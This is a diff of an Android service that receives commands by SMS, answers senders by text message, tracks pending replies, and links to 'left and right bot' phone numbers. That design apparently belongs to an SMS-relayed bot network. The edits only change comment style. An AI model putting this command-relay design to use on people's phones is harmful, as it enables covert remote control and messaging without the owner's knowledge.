@@ -43,8 +43,8 @@ public class ResponseService extends Service{
 	//private BroadcastReceiver waitmode ;
 	
 	public void onCreate() {
-		//in case of some of the class forget to lock the Service lock
-		//Just in case.
+		/* in case of some of the class forget to lock the Service lock */
+		/* Just in case. */
 		CommonVariable.ResponseServiceLock = "true";
 		Debug.PrintLog("ResponseService","ResponseServiceLock set "+CommonVariable.ResponseServiceLock);		
 		
@@ -64,8 +64,7 @@ public class ResponseService extends Service{
 		Debug.PrintLog("ResponseService","ResponseServiceLock set "+CommonVariable.ResponseServiceLock);
 	}
 	@Override
-	public IBinder onBind(Intent intent) {
-		// TODO Auto-generated method stub
+	public IBinder onBind(Intent intent) {		
 		return null;
 	}
 	
@@ -78,7 +77,7 @@ public class ResponseService extends Service{
 			this.stopSelf();
 		}
 		
-		//if there are multi command in the job queue, execute all
+		/* if there are multi command in the job queue, execute all */
 		else {
 			while(!CommandJob.isResponseEmpty()) {
 				job = CommandJob.getResponseJob();
@@ -95,12 +94,12 @@ public class ResponseService extends Service{
 		Debug.PrintLog("ResponseService","WaitMode get: " + message);
 		/* parse command */
 		String[] cmd = message.split(CommonVariable.SEPERATE) ;
-		// is WAIT RESPONSE
+		/* is WAIT RESPONSE */
 		if ( cmd[0].contains(CommonVariable.RESPONSE_SIGN) ) {
 			if ( cmd[1].contains(CommonVariable.PHONE_NUMBER_RESPONSE)  ) {
-				// pause ScreenMonitor
+				/* pause ScreenMonitor */
 				
-				// inform sender for receiving message success
+				/* inform sender for receiving message success */
 				try {
 					SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,cmd[5],false);
 				}catch ( Exception e ) {
@@ -111,10 +110,10 @@ public class ResponseService extends Service{
 				
 				CommonVariable.selfNumber = cmd[2].trim();
 				Debug.PrintLog("ResponseService","I got the PHONE_NUMBER_RESPONSE signal and the number is "+CommonVariable.selfNumber);
-				// reset left and right bot 
+				/* reset left and right bot */ 
 				CommonVariable.leftBotNumber = CommonVariable.rightBotNumber = "" ;
 				
-				// remove the element in responseJobQueue
+				/* remove the element in responseJobQueue */
 				try {
 					if ( !ResponseTable.remove(sender,CommonVariable.PHONE_NUMBER_RESPONSE,cmd[3].trim()) ) {
 						Debug.PrintLog("ResponseService", "remove PHONE_NUMBER_RESPONSE from responseJobQueue failed");
@@ -127,7 +126,7 @@ public class ResponseService extends Service{
 				}
 				
 				
-				//get the pnone number and register to net
+				/* get the pnone number and register to net */
 				CommonVariable.ResponseServiceLock = "false";
 				Intent i = new Intent(this, ScreenMonitor.class);			
 				this.startService(i);
@@ -135,9 +134,9 @@ public class ResponseService extends Service{
 				
 			}
 			else if ( cmd[1].contains(CommonVariable.HAVE_RECEIVED) ) {
-				// got it					
+				/* got it */					
 				Debug.PrintLog("ResponseService","I got the HAVE_RECEIVED signal");
-				// remove the element in responseJobQueue
+				/* remove the element in responseJobQueue */
 				try {
 					if ( !ResponseTable.remove(sender,CommonVariable.HAVE_RECEIVED,cmd[2]) ) {
 						Debug.PrintLog("ResponseService", "remove HAVE_RECEIVED from responseJobQueue failed.[number="+sender+" time="+cmd[2]+"]");
@@ -176,13 +175,13 @@ public class ResponseService extends Service{
 		}
 	}
 	private boolean SendSMS ( String sender, String destNumber, String message, String state, String receivedTime, boolean isToWaitResponse ) {
-        // wait others send back
+        /* wait others send back */
         if ( isToWaitResponse == true ) {
         	String time = ResponseTable.addJob(destNumber, message, state, receivedTime);
         	SmsManager smsManager = SmsManager.getDefault();  
             smsManager.sendTextMessage(destNumber, null, message+CommonVariable.SEPERATE+time, null, null);
         }
-        // return back
+        /* return back */
         else {
         	if ( !sender.equals("0000") ) {
 	        	if ( receivedTime == null ) {
